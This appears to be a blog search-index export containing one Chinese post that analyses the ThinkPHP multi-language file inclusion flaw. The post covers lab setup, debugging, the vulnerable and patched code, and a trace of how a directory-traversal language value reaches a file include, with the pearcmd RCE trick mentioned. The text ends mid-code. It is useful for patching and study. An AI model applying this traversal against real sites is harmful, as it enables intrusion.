<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ThinkPHP 多语言功能开启下文件包含漏洞</title>
      <link href="/2023/03/22/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80%E5%8A%9F%E8%83%BD%E5%BC%80%E5%90%AF%E4%B8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/03/22/ThinkPHP%20%E5%A4%9A%E8%AF%AD%E8%A8%80%E5%8A%9F%E8%83%BD%E5%BC%80%E5%90%AF%E4%B8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-多语言功能开启下文件包含漏洞"><a href="#ThinkPHP-多语言功能开启下文件包含漏洞" class="headerlink" title="ThinkPHP 多语言功能开启下文件包含漏洞"></a>ThinkPHP 多语言功能开启下文件包含漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>ThinkPHP 是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架。Thinkphp 在开启多语言功能的情况下存在文件包含漏洞，结合特殊环境可能造成远程代码执行。Thinkphp官方已于9月25日的V6.0.14 版本中修复。</p><p>受影响版本</p><pre class=" language-1"><code class="language-1">v6.0.0 ~ v6.0.13v5.1.x < v5.1.42v5.0.x</code></pre><p>安全版本</p><pre class=" language-1"><code class="language-1">v6.0.14v5.1.42</code></pre><p>如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。</p><h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><p>开启多语言功能</p><h3 id="ThinkPHP6"><a href="#ThinkPHP6" class="headerlink" title="ThinkPHP6"></a>ThinkPHP6</h3><p><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037637">ThinkPHP6.0完全开发手册-多语言</a></p><p>app/middleware.php ：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 全局中间件定义文件</span><span class="token keyword">return</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true">// 全局请求缓存</span>    <span class="token comment" spellcheck="true">// \think\middleware\CheckRequestCache::class,</span>    <span class="token comment" spellcheck="true">// 多语言加载</span>    \<span class="token package">think<span class="token punctuation">\</span>middleware<span class="token punctuation">\</span>LoadLangPack</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// Session初始化</span>    <span class="token comment" spellcheck="true">// \think\middleware\SessionInit::class</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><h3 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a>ThinkPHP5</h3><p><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037637">ThinkPHP5.0完全开发手册-多语言</a></p><p>config/app.php</p><p>application/config.php</p><pre class=" language-php"><code class="language-php"><span class="token string">'lang_switch_on'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span></code></pre><h2 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h2><p>官方地址:<a href="https://github.com/top-think/think">https://github.com/top-think/think</a></p><p>这里以v6.0.12版本作为复现环境。</p><p>ThinkPHP6.0的环境要求如下：</p><pre><code>PHP &gt;= 7.2.56.0版本开始，必须通过Composer方式安装和更新，所以你无法通过Git下载安装。</code></pre><h3 id="安装composer"><a href="#安装composer" class="headerlink" title="安装composer"></a>安装composer</h3><p>如果还没有安装 Composer，在 Linux 和 Mac OS X 中可以运行如下命令：</p><pre><code>curl -sS https://getcomposer.org/installer | phpmv composer.phar /usr/local/bin/composer</code></pre><p>在 Windows 中，你需要下载并运行 <a href="https://getcomposer.org/Composer-Setup.exe">Composer-Setup.exe</a>。</p><p>由于众所周知的原因，国外的网站连接速度很慢。因此安装的时间可能会比较长，我们建议使用国内镜像。<br>打开命令行窗口（windows用户）或控制台（Linux、Mac 用户）并执行如下命令：</p><pre><code>阿里云：composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/华为云：composer config -g repo.packagist composer https://repo.huaweicloud.com/repository/php/</code></pre><h3 id="安装ThinkPHP-v6-0-12"><a href="#安装ThinkPHP-v6-0-12" class="headerlink" title="安装ThinkPHP v6.0.12"></a>安装ThinkPHP v6.0.12</h3><pre class=" language-bash"><code class="language-bash">root@ubuntu:/var/www/<span class="token comment" spellcheck="true"># git clone https://github.com/top-think/think.git think_git</span>root@ubuntu:/var/www/<span class="token comment" spellcheck="true"># cd think_git</span>root@ubuntu:/var/www/think_git<span class="token comment" spellcheck="true"># git checkout v6.0.12</span></code></pre><p>更改<code>composer.json</code>，安装<code>v6.0.12</code>：</p><pre class=" language-json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">">=7.2.5"</span><span class="token punctuation">,</span>    <span class="token property">"topthink/framework"</span><span class="token operator">:</span> <span class="token string">"6.0.12"</span><span class="token punctuation">,</span>    <span class="token property">"topthink/think-orm"</span><span class="token operator">:</span> <span class="token string">"^2.0"</span><span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><pre class=" language-bash"><code class="language-bash">root@ubuntu:/var/www/think_git<span class="token comment" spellcheck="true">#composer install</span></code></pre><p>也可以直接下载:<a href="https://github.com/top-think/think/releases/tag/v6.0.12">https://github.com/top-think/think/releases/tag/v6.0.12</a></p><p>我在实际配置的过程中，在进行<code>composer install</code>时，并不会按照<code>composer.json</code>中所写的去下载<code>"topthink/framework": "6.0.12"</code>，而是去下载了最新版本，于是我手动下载了<a href="https://codeload.github.com/top-think/framework/zip/refs/tags/v6.0.13">v6.0.13版本</a>并进行了替换。</p><h3 id="打开多语言配置"><a href="#打开多语言配置" class="headerlink" title="打开多语言配置"></a>打开多语言配置</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 全局中间件定义文件</span><span class="token keyword">return</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true">// 全局请求缓存</span>    <span class="token comment" spellcheck="true">// \think\middleware\CheckRequestCache::class,</span>    <span class="token comment" spellcheck="true">// 多语言加载</span>    \<span class="token package">think<span class="token punctuation">\</span>middleware<span class="token punctuation">\</span>LoadLangPack</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// Session初始化</span>    <span class="token comment" spellcheck="true">// \think\middleware\SessionInit::class</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><h3 id="测试运行"><a href="#测试运行" class="headerlink" title="测试运行"></a>测试运行</h3><p>现在只需要做最后一步来验证是否正常运行。</p><p>进入命令行下面，执行下面指令</p><pre><code>php think run</code></pre><p>在浏览器中输入地址：</p><pre><code>http://localhost:8000/</code></pre><p>会看到欢迎页面。恭喜你，现在已经完成ThinkPHP6.0的安装！</p><p>如果你本地80端口没有被占用的话，也可以直接使用</p><pre><code>php think run -p 80</code></pre><p>然后就可以直接访问：</p><pre><code>http://localhost/</code></pre><h2 id="IDEA-PHPStudy-Xdebug-配置PHP-DEBUG环境"><a href="#IDEA-PHPStudy-Xdebug-配置PHP-DEBUG环境" class="headerlink" title="IDEA+PHPStudy+Xdebug 配置PHP DEBUG环境"></a>IDEA+PHPStudy+Xdebug 配置PHP DEBUG环境</h2><p>如果不是IDEA这个DEBUG配置折磨了我一整个下午，我绝对不会写上来（一开始就配置的挺好的，非要去整烂活），真的脑溢血了。</p><p>首先我用的PHP版本是7.3.4，并且使用PHPStudy环境下载的，用起来较为方便。</p><p>打开idea，打开<code>file/settings/plugins</code>，下载<code>php</code>插件。下载完后重启idea，打开<code>file/settings/Languages &amp; Framworks/php</code>，选择<code>PHP language level</code>。</p><p>选择<code>CLI interpreter</code>，新建，以我本地配置为例，<code>PHP executable</code>为<code>php.exe</code>的绝对路径<code>F:\phpStudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe</code>。填写<code>Debugger extension</code>为<code>php_xdebug.dll</code>的绝对路径<code>F:\phpStudy\phpstudy_pro\Extensions\php\php7.3.4nts\ext</code>。</p><p>如果本地没有Xdebug，可以利用PHPStudy直接下载。</p><p><code>php.ini</code>中需要添加：</p><pre class=" language-ini"><code class="language-ini"><span class="token selector">[Xdebug]</span><span class="token constant">zend_extension</span><span class="token attr-value"><span class="token punctuation">=</span>F:/phpStudy/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll</span><span class="token constant">xdebug.collect_params</span><span class="token attr-value"><span class="token punctuation">=</span>1</span><span class="token constant">xdebug.collect_return</span><span class="token attr-value"><span class="token punctuation">=</span>1</span><span class="token constant">xdebug.auto_trace</span><span class="token attr-value"><span class="token punctuation">=</span>On</span><span class="token constant">xdebug.trace_output_dir</span><span class="token attr-value"><span class="token punctuation">=</span>F:/phpStudy/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace</span><span class="token constant">xdebug.profiler_enable</span><span class="token attr-value"><span class="token punctuation">=</span>On</span><span class="token constant">xdebug.profiler_output_dir</span><span class="token attr-value"><span class="token punctuation">=</span>"F:\phpStudy\phpstudy_pro\Extensions\tmp\xdebug"</span><span class="token constant">xdebug.remote_autostart</span><span class="token attr-value"><span class="token punctuation">=</span>1</span><span class="token constant">xdebug.remote_enable</span><span class="token attr-value"><span class="token punctuation">=</span>On</span><span class="token constant">xdebug.idekey</span><span class="token attr-value"><span class="token punctuation">=</span>PHPSTORM</span><span class="token constant">xdebug.remote_host</span><span class="token attr-value"><span class="token punctuation">=</span>127.0.0.1</span><span class="token constant">xdebug.remote_port</span><span class="token attr-value"><span class="token punctuation">=</span>9010</span><span class="token constant">xdebug.remote_handler</span><span class="token attr-value"><span class="token punctuation">=</span>dbgp</span></code></pre><p><code>zend_extension</code>需要根据本地情况进行修改。</p><p><code>xdebug.trace_output_dir</code>，<code>xdebug.profiler_output_dir</code>改为自己想改的目录即可。</p><p><code>xdebug.idekey</code>与<code>xdebug.remote_port</code>随意设置，只需要保证与idea中设置相同即可。</p><p>添加完后打开idea中的<code>file/settings/Languages &amp; Framworks/php/Debug</code>将其中的<code>Xdebug</code>中的<code>Debug port</code>改为<code>php.ini</code>中的<code>xdebug.remote_port</code>。</p><p>正常运行<code>thinkphp</code>，以我本地为例，输入<code>php think run -p 11233</code>，然后浏览器访问，idea中会弹出一个窗口，点击确定即可（如果不做更改，之后应该不会弹出该窗口）。</p><p>然后正常设置断点进行调试即可。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">detect</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 自动侦测设置获取语言选择</span>    <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'detect_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// url中设置了语言变量</span>        <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'detect_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">header</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'header_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Header中设置了语言变量</span>        <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">header</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'header_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'cookie_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Cookie中设置了语言变量</span>        <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'cookie_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string">'HTTP_ACCEPT_LANGUAGE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 自动侦测浏览器语言</span>        <span class="token variable">$match</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^([a-z\d\-]+)/i'</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string">'HTTP_ACCEPT_LANGUAGE'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'accept_language'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$langSet</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'accept_language'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$langSet</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'allow_lang_list'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$langSet</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'allow_lang_list'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 合法的语言</span>        <span class="token variable">$range</span> <span class="token operator">=</span> <span class="token variable">$langSet</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setLangSet</span><span class="token punctuation">(</span><span class="token variable">$range</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$range</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getLangSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$range</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>修复</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">detect</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 自动侦测设置获取语言选择</span>        <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'detect_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// url中设置了语言变量</span>            <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'detect_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">header</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'header_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Header中设置了语言变量</span>            <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">header</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'header_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'cookie_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Cookie中设置了语言变量</span>            <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'cookie_var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string">'HTTP_ACCEPT_LANGUAGE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 自动侦测浏览器语言</span>            <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string">'HTTP_ACCEPT_LANGUAGE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^([a-z\d\-]+)/i'</span><span class="token punctuation">,</span> <span class="token variable">$langSet</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'accept_language'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$langSet</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'accept_language'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$langSet</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getLangSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'allow_lang_list'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$langSet</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'allow_lang_list'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 合法的语言</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setLangSet</span><span class="token punctuation">(</span><span class="token variable">$langSet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$langSet</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getLangSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$langSet</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>添加了正则<code>/^([a-z\d\-]+)/i</code>，匹配字母数字和<code>-</code>。如果无法匹配，则将<code>$langSet</code>置为默认语言，这里是<code>zh-cn</code>。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在<code>\vendor\topthink\framework\src\think\middleware\LoadLangPack.php</code>中设置断点。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 自动侦测当前语言</span>    <span class="token variable">$langset</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">detect</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">defaultLangSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token variable">$langset</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">switchLangSet</span><span class="token punctuation">(</span><span class="token variable">$langset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">saveToCookie</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">app</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookie</span><span class="token punctuation">,</span> <span class="token variable">$langset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>每个<code>middleware</code>的<code>handle()</code>函数都会被调用，这里断在<code>LoadLangPack.php</code>的<code>handle()</code>，直接在最开头调用 <code>$langset = $this-&gt;detect($request);</code> </p><p>跟进这个<code>detect()</code>，可以看到依次排查了<code>GET["lang"]</code>、 <code>HEADER["think-lang"]</code>、<code>COOKIE["think_lang"]</code>，并且将其不做任何过滤，直接赋值给了<code>$langSet</code>：</p><p>然后默认情况下，即<code>allow_lang_list</code>这个配置为空，<code>$langSet</code>被赋值给<code>$range</code>，而<code>$range</code>被返回：</p><p>回到<code>handle()</code>，如果返回的<code>$langset</code>不等于默认的<code>langset</code>，即<code>zh-cn</code>，那么就会调用<code>$this-&gt;lang-&gt;switchLangSet($langset)</code>，正是在这里面实现了文件包含：</p><p>跟进<code>switchLangSet()</code>，可以看到调用了<code>$this-&gt;load()</code>，而传入的参数直接拼接而成，本例中传入的最终结果是 <code>D:\var\www\think6\vendor\topthink\framework\src\lang\../../../../../index.php</code>：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">app</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getThinkPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'lang'</span> <span class="token punctuation">.</span> <span class="token constant">DIRECTORY_SEPARATOR</span> <span class="token punctuation">.</span> <span class="token variable">$langset</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>跟进这个<code>load()</code>，可以看到直接将传入的参数作为文件名，先判断文件在不在，如果在就传入<code>parse()</code>中，进行文件包含：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$range</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">array</span><span class="token punctuation">{</span>    <span class="token variable">$range</span> <span class="token operator">=</span> <span class="token variable">$range</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token 